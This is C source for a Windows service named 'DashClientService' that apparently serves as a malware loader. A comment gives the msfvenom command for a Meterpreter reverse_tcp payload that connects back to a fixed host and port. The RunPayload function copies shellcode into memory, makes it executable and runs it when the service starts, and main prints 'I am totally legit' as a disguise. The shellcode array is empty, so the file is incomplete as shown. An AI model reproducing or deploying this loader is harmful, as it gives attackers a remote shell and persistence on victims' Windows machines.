#include <windows.h>
#include <tchar.h>
#include <stdio.h>

#define SERVICE_NAME TEXT("DashClientService")

SERVICE_STATUS css_ServiceStatus;
SERVICE_STATUS_HANDLE css_StatusHandle;
HANDLE css_ServiceStopEvent = NULL;

// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.219.1 LPORT=8080 -f c
unsigned char shellcode[] =


BOOL RunPayload() {
	//OutputDebugStringA("Message from DashClientService");
	LPVOID addressPointer = VirtualAlloc(NULL, 512, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (addressPointer) {
		memcpy(addressPointer, shellcode, 512);
		DWORD flOldProtect = 0;
		if (VirtualProtect(addressPointer, sizeof(addressPointer), PAGE_EXECUTE, &flOldProtect)) {
			((void(*)()) addressPointer)();
		}
	}
	return TRUE;
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
	switch (CtrlCode) {
	case SERVICE_CONTROL_STOP:

		if (css_ServiceStatus.dwCurrentState != SERVICE_RUNNING) {
			break;
		}

		css_ServiceStatus.dwControlsAccepted = css_ServiceStatus.dwWin32ExitCode = 0;
		css_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		css_ServiceStatus.dwCheckPoint = 4;

		if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
			return;
		}

		// This will signal the worker thread to start shutting down
		SetEvent(css_ServiceStopEvent);
		break;

	default:
		break;
	}
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
	DWORD css_Status = E_FAIL;
	css_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
	if (!css_StatusHandle) {
		return;
	}

	ZeroMemory(&css_ServiceStatus, sizeof(css_ServiceStatus));
	css_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	css_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;

	css_ServiceStatus.dwControlsAccepted = 
		css_ServiceStatus.dwWin32ExitCode = 
		css_ServiceStatus.dwServiceSpecificExitCode = 
		css_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}

	css_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (css_ServiceStopEvent == NULL) {
		css_ServiceStatus.dwControlsAccepted = 0;
		css_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		css_ServiceStatus.dwWin32ExitCode = GetLastError();
		css_ServiceStatus.dwCheckPoint = 1;

		if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
			return;
		}
		return;
	}

	css_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	css_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	css_ServiceStatus.dwWin32ExitCode = css_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}
	//
	//ENTER CUSTOM CODE HERE
	if (!RunPayload()) {
		//Payload Execution Failed. Do Something
	}
	//

	css_ServiceStatus.dwControlsAccepted = css_ServiceStatus.dwWin32ExitCode = 0;
	css_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	css_ServiceStatus.dwCheckPoint = 3;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}
}

int main(int argc, char* argv[]) {
	printf("I am totally legit\n");
	SERVICE_TABLE_ENTRY css_DispatchTable[] = {
		{
			(LPTSTR)SERVICE_NAME,
			(LPSERVICE_MAIN_FUNCTION)ServiceMain
		},
		{
			NULL,
			NULL
		}
	};
	if (!StartServiceCtrlDispatcher(css_DispatchTable))
	{
		return 0;
	}
	return 1;
}

